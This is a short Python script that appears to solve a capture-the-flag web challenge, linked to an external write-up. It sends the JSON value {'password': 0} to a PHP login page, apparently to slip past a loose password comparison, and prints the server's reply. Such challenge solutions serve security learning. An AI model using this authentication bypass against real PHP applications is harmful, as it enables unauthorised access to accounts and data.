#!/usr/bin/python
# coding: utf-8


"""

write up : http://chaneyoon.tistory.com/207

"""


import requests

url = "http://burger.laboratorium.ee:8003/index.php"

data = {
    "data": '{"password": 0}'
}

content = requests.post(url, data=data).content



print "\n", content, "\n"